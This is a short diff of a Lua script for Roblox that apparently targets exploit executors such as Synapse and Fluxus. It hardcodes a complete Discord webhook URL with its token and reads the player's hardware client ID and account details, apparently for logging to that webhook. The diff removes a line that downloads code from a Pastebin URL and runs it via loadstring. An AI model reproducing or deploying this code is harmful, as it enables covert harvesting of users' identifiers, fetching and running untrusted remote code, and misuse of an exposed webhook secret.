@@ -1,7 +1,6 @@
 local Webhook = "https://discordapp.com/api/webhooks/1497206709175849163/5LsV6mlZlFctEKLMBmlCDvuN2FQTHuI_XJMrCqV1Y4e8XokOEbAJrunSh8GkuL7gaDyT"
 _G.Discord_UserID = ''
 local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-local blacklist = loadstring(game:HttpGet("https://pastebin.com/raw/ms8MraRn"))()
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local player = game:GetService "Players".LocalPlayer
 local joinTime = os.time() - (player.AccountAge * 86400)
